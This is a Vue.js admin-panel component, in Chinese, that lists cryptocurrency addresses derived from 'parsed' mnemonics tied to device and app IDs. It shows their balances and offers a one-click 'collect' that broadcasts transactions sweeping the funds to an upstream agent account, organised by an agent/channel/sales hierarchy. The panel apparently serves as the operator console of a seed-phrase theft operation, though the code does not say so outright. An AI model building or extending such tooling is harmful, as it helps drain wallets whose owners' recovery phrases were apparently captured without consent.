<template>
  <div class="list-fill">
    <div class="list-fill-head">
    <div class="mn-head"><h1>全部地址</h1><div class="rule"></div></div>
    <p class="mn-sub">仅展示已解析的助记词派生地址，可一键归集到上级代理账户。
      <router-link to="/collect-records">查看归集日志 →</router-link>
    </p>
    <form class="mn-filters" @submit.prevent="search">
      <select v-model="filters.chaintype">
        <option value="">全部链</option>
        <option v-for="c in chainOptions" :key="c.code" :value="c.code">{{ c.label }}</option>
      </select>
      <input v-model="filters.device_id" placeholder="设备 ID" maxlength="64" />
      <input v-model="filters.appid" placeholder="应用 ID" maxlength="64" />
      <input v-model="filters.address" placeholder="地址" maxlength="128" />
      <select v-model="filters.agent_id">
        <option value="">归属代理</option>
        <option v-for="a in agents" :key="a.id" :value="String(a.id)">{{ a.display_name || a.displayName }}</option>
      </select>
      <select v-model="filters.channel_id" :disabled="!filters.agent_id">
        <option value="">归属渠道</option>
        <option v-for="c in channelsOf(filters.agent_id)" :key="c.id" :value="String(c.id)">{{ c.display_name || c.displayName }}</option>
      </select>
      <select v-model="filters.sales_id" :disabled="!filters.channel_id">
        <option value="">归属业务</option>
        <option v-for="s in salesOf(filters.channel_id)" :key="s.id" :value="String(s.id)">{{ s.display_name || s.displayName }}</option>
      </select>
      <button type="submit" class="btn-filter-search">查询</button>
      <button type="button" class="btn-filter-reset" @click="reset">重置</button>
    </form>
    <div class="mn-stats">共 {{ total }} 条 · 第 {{ page + 1 }} / {{ totalPages || 1 }} 页</div>
    </div>
    <div class="mn-table-card">
      <div v-if="!items.length" class="mn-empty">暂无地址数据</div>
      <table v-else class="mn-table mn-table-addr">
        <thead>
          <tr>
            <th class="col-id">ID</th>
            <th>链</th>
            <th>地址</th>
            <th class="col-bal">
              <button type="button" class="mn-sort-toggle" :class="sortClass('native')" @click="toggleSort('native')" title="按原生币排序">
                <span>原生币</span>
                <span class="mn-sort-ico" aria-hidden="true">
                  <i class="mn-sort-up"></i><i class="mn-sort-down"></i>
                </span>
              </button>
            </th>
            <th class="col-bal">
              <button type="button" class="mn-sort-toggle" :class="sortClass('usdt')" @click="toggleSort('usdt')" title="按 USDT 排序">
                <span>USDT</span>
                <span class="mn-sort-ico" aria-hidden="true">
                  <i class="mn-sort-up"></i><i class="mn-sort-down"></i>
                </span>
              </button>
            </th>
            <th class="col-bal">
              <button type="button" class="mn-sort-toggle" :class="sortClass('usdc')" @click="toggleSort('usdc')" title="按 USDC 排序">
                <span>USDC</span>
                <span class="mn-sort-ico" aria-hidden="true">
                  <i class="mn-sort-up"></i><i class="mn-sort-down"></i>
                </span>
              </button>
            </th>
            <th>设备 / AppID</th>
            <th>归属</th>
            <th>时间</th>
            <th class="col-act">操作</th>
          </tr>
        </thead>
        <tbody>
          <tr v-for="a in items" :key="a.id" class="mn-row">
            <td class="col-id">{{ a.id }}</td>
            <td><span class="mn-source">{{ a.chaintype }}</span></td>
            <td>
              <div class="mn-addr-cell">
                <div class="mn-addr">
                  <a v-if="a.explorer_url" class="addr-link" :href="a.explorer_url" target="_blank" rel="noopener noreferrer">{{ a.address }}</a>
                  <span v-else>{{ a.address }}</span>
                </div>
                <div v-if="a.mnemonic_id" class="mn-addr-mnemonic">
                  关联助记词：<router-link class="mn-mnemonic-link" :to="'/mnemonics?id=' + a.mnemonic_id">{{ a.mnemonic_id }}</router-link>
                </div>
              </div>
            </td>
            <td>{{ a.native_bal }}</td>
            <td>{{ a.usdt_bal }}</td>
            <td>{{ a.usdc_bal }}</td>
            <td>
              <router-link v-if="a.deviceId" class="mn-device mn-device-link" :to="'/devices/' + a.deviceId">{{ a.deviceId }}</router-link>
              <div v-else class="mn-device">—</div>
              <div class="mn-appid">{{ a.appId || "—" }}</div>
            </td>
            <td><div class="mn-owner">{{ a.owner_label || "—" }}</div></td>
            <td class="col-time">
              <div class="mn-time-stack">
                <div class="mn-time-row"><span class="mn-time-k">添加</span><span class="mn-time-v">{{ a.addtime_label }}</span></div>
                <div class="mn-time-row"><span class="mn-time-k">刷新</span><span class="mn-time-v">{{ a.updatetime_label }}</span></div>
              </div>
            </td>
            <td class="col-act">
              <div class="addr-act-stack">
                <button v-if="a.can_refresh" type="button" class="btn-addr-refresh" :disabled="busy[a.id]" @click="refresh(a)">刷新余额</button>
                <button v-if="a.can_collect" type="button" class="btn-addr-collect" :disabled="busy[a.id]" @click="openCollect(a)">一键归集</button>
                <span v-if="!a.can_refresh && !a.can_collect" class="addr-act-empty">—</span>
              </div>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
    <div class="vue-pager list-fill-foot" v-if="total">
      <div>第 {{ page + 1 }} / {{ totalPages || 1 }} 页 · 共 {{ total }} 条</div>
      <div class="links">
        <button :disabled="page<=0" @click="go(page-1)">上一页</button>
        <button :disabled="page+1>=totalPages" @click="go(page+1)">下一页</button>
      </div>
    </div>
    <div v-if="collect.open" class="addr-collect-overlay is-open" @click.self="closeCollect">
      <div class="addr-collect-dialog">
        <div class="addr-collect-head">
          <h2>一键归集</h2>
          <button type="button" class="addr-collect-close" @click="closeCollect">×</button>
        </div>
        <div class="addr-collect-body">
          <div v-if="collect.loading && !collect.result">{{ collect.executing ? "正在广播交易，请稍候…" : "加载中…" }}</div>
          <template v-else>
            <p class="addr-collect-msg" :class="{ 'addr-collect-ok': collect.doneOk, 'addr-collect-warn': collect.resultError || !!collect.preview.error }">
              {{ collectDoneTitle }}
            </p>
            <div v-if="collect.preview.from_address && !collect.doneOk" class="addr-collect-meta">
              <div>链：{{ collect.preview.chain_label || collect.preview.chain }}</div>
              <div>转出：<code>{{ collect.preview.from_address }}</code></div>
              <div>转入：<code>{{ collect.preview.to_address || "未设置" }}</code></div>
              <div>代理：{{ collect.preview.agent_display_name }}</div>
              <div>余额：{{ collect.preview.native_bal }} {{ collect.preview.native_symbol }} / USDT {{ collect.preview.usdt_bal }}</div>
            </div>
            <div v-if="collect.transferLines && collect.transferLines.length" class="addr-collect-result">
              <div v-for="(line, i) in collect.transferLines" :key="i" :class="{ 'is-err': line.err }">{{ line.text }}</div>
            </div>
            <pre
              v-else-if="collect.result && collect.result !== collectDoneTitle"
              class="addr-collect-result"
              :class="{ 'is-err': collect.resultError }"
            >{{ collect.result }}</pre>
          </template>
        </div>
        <div class="addr-collect-actions">
          <button type="button" class="btn-addr-collect-cancel" @click="closeCollect">
            {{ collectFinished ? "关闭" : "取消" }}
          </button>
          <button
            v-if="!collectFinished"
            type="button"
            class="btn-addr-collect-ok"
            :disabled="!canExecute"
            @click="executeCollect"
          >确认执行</button>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
import { api } from "../api/http";
import { toast } from "../utils/ui";
export default {
  data() {
    return {
      items: [], page: 0, size: 50, total: 0, totalPages: 0,
      sort: "", order: "",
      filters: { chaintype: "", device_id: "", appid: "", address: "", agent_id: "", channel_id: "", sales_id: "" },
      hierarchy: { agents: [], channels: [], sales: [] },
      chainOptions: [],
      busy: {},
      collect: {
        open: false, loading: false, executing: false, preview: {}, result: "", resultError: false,
        doneOk: false, transferLines: [], rowId: 0,
      },
    };
  },
  computed: {
    agents() { return this.hierarchy.agents || []; },
    collectFinished() {
      return !!(this.collect.doneOk || this.collect.resultError || this.collect.result
        || (this.collect.preview && this.collect.preview.ok === false));
    },
    canExecute() {
      const p = this.collect.preview || {};
      return !this.collect.loading && !this.collect.executing && p.ok && p.to_address
        && (p.coins || []).length && !this.collectFinished;
    },
    collectDoneTitle() {
      if (this.collect.doneOk) return "归集完成";
      if (this.collect.resultError || (this.collect.preview && this.collect.preview.ok === false)) {
        return (this.collect.preview && this.collect.preview.error) || this.collect.result || "归集失败";
      }
      return (this.collect.preview && (this.collect.preview.message || this.collect.preview.error)) || "";
    },
  },
  watch: {
    "filters.agent_id"() { this.filters.channel_id = ""; this.filters.sales_id = ""; },
    "filters.channel_id"() { this.filters.sales_id = ""; },
  },
  mounted() { this.reload(); },
  methods: {
    channelsOf(agentId) {
      if (!agentId) return [];
      return (this.hierarchy.channels || []).filter((c) => String(c.parent_id || c.parentId) === String(agentId));
    },
    salesOf(channelId) {
      if (!channelId) return [];
      return (this.hierarchy.sales || []).filter((s) => String(s.parent_id || s.parentId) === String(channelId));
    },
    async reload() {
      try {
        const body = await api.addresses({
          page: this.page, size: this.size, sort: this.sort, order: this.order, ...this.filters,
        });
        const d = body.data || {};
        this.items = d.items || [];
        this.total = d.total || 0;
        this.totalPages = d.totalPages || 0;
        this.page = d.page || 0;
        this.hierarchy = d.owner_hierarchy || this.hierarchy;
        this.chainOptions = d.chain_options || this.chainOptions;
      } catch (e) { toast(e.message, "err"); }
    },
    search() { this.page = 0; this.reload(); },
    reset() {
      this.filters = { chaintype: "", device_id: "", appid: "", address: "", agent_id: "", channel_id: "", sales_id: "" };
      this.sort = ""; this.order = "";
      this.search();
    },
    sortClass(field) {
      if (this.sort !== field) return "";
      return this.order === "asc" ? "is-asc" : this.order === "desc" ? "is-desc" : "";
    },
    toggleSort(field) {
      if (this.sort !== field) {
        this.sort = field;
        this.order = "desc";
      } else if (this.order === "desc") {
        this.order = "asc";
      } else {
        this.sort = "";
        this.order = "";
      }
      this.search();
    },
    go(p) { this.page = p; this.reload(); },
    async refresh(a) {
      this.busy = { ...this.busy, [a.id]: true };
      try {
        const body = await api.addressRefresh(a.id);
        const d = body.data || {};
        a.native_bal = d.native_bal; a.usdt_bal = d.usdt_bal; a.usdc_bal = d.usdc_bal;
        a.nativeBal = d.native_bal; a.usdtBal = d.usdt_bal;
        a.updatetime_label = d.updatetime_label;
        a.can_collect = d.can_collect;
        toast("已刷新");
      } catch (e) { toast(e.message, "err"); }
      finally { this.busy = { ...this.busy, [a.id]: false }; }
    },
    async openCollect(a) {
      this.collect = {
        open: true, loading: true, executing: false, preview: {}, result: "", resultError: false,
        doneOk: false, transferLines: [], rowId: a.id,
      };
      try {
        const body = await api.collectPreview(a.id);
        const p = body.data || {};
        this.collect.preview = { ...p, message: p.ok === false ? "" : (p.message || "") };
        if (p.ok === false) {
          this.collect.resultError = true;
          this.collect.result = p.error || p.message || "无法预览";
          toast(this.collect.result, "err");
        }
      } catch (e) {
        const d = (e.body && e.body.data) || {};
        const detail = d.error || d.message || e.message || "无法预览";
        this.collect.preview = {
          ok: false,
          error: detail,
          message: "",
          need_setup: !!d.need_setup,
          from_address: d.from_address,
          to_address: d.to_address,
          chain: d.chain,
          chain_label: d.chain_label,
          native_bal: d.native_bal,
          usdt_bal: d.usdt_bal,
          native_symbol: d.native_symbol,
          agent_display_name: d.agent_display_name,
          coins: d.coins || [],
        };
        this.collect.resultError = true;
        this.collect.result = detail;
        toast(detail, "err");
      } finally {
        this.collect.loading = false;
      }
    },
    closeCollect() {
      this.collect.open = false;
    },
    transferLinesFrom(data) {
      const lines = [];
      for (const t of (data && data.transfers) || []) {
        if (t.ok) {
          lines.push({ err: false, text: `${t.coin || ""} ${t.amount || ""} 成功${t.hash ? " · " + t.hash : ""}` });
        } else {
          lines.push({ err: true, text: `${t.coin || ""} 失败：${t.error || "未知错误"}` });
        }
      }
      return lines;
    },
    async executeCollect() {
      const p = this.collect.preview || {};
      const from = String(p.from_address || "").trim();
      const to = String(p.to_address || "").trim();
      const chain = String(p.chain || p.chain_label || "").toLowerCase();
      const same = from && to && (("eth" === chain || "bsc" === chain || "bnb" === chain)
        ? from.toLowerCase() === to.toLowerCase()
        : from === to);
      if (same) {
        const detail = "发送地址与接收地址相同，无法归集";
        this.collect.doneOk = false;
        this.collect.resultError = true;
        this.collect.transferLines = [];
        this.collect.preview = { ...this.collect.preview, message: "", error: detail, ok: false };
        this.collect.result = detail;
        toast(detail, "err");
        return;
      }
      this.collect.executing = true;
      this.collect.loading = true;
      try {
        const body = await api.collectExecute(this.collect.rowId);
        const d = body.data || body || {};
        if (d.ok === false) {
          this.collect.doneOk = false;
          this.collect.resultError = true;
          this.collect.transferLines = this.transferLinesFrom(d);
          const detail = d.error || d.message || "归集失败";
          this.collect.preview = { ...this.collect.preview, message: "", error: detail, ok: false };
          this.collect.result = this.collect.transferLines.length ? "" : detail;
          toast(detail, "err");
          return;
        }
        this.collect.doneOk = true;
        this.collect.resultError = false;
        this.collect.transferLines = this.transferLinesFrom(d);
        this.collect.result = this.collect.transferLines.length ? "" : JSON.stringify(d, null, 2);
        this.collect.preview = { ...this.collect.preview, message: "", error: "" };
        toast("归集完成");
        this.reload();
      } catch (e) {
        const d = (e.body && e.body.data) || {};
        this.collect.doneOk = false;
        this.collect.resultError = true;
        this.collect.transferLines = this.transferLinesFrom(d);
        const detail = d.error || d.message || e.message || "归集失败";
        this.collect.preview = { ...this.collect.preview, message: "", error: detail, ok: false };
        this.collect.result = this.collect.transferLines.length ? "" : detail;
        toast(detail, "err");
      } finally {
        this.collect.loading = false;
        this.collect.executing = false;
      }
    },
  },
};
</script>
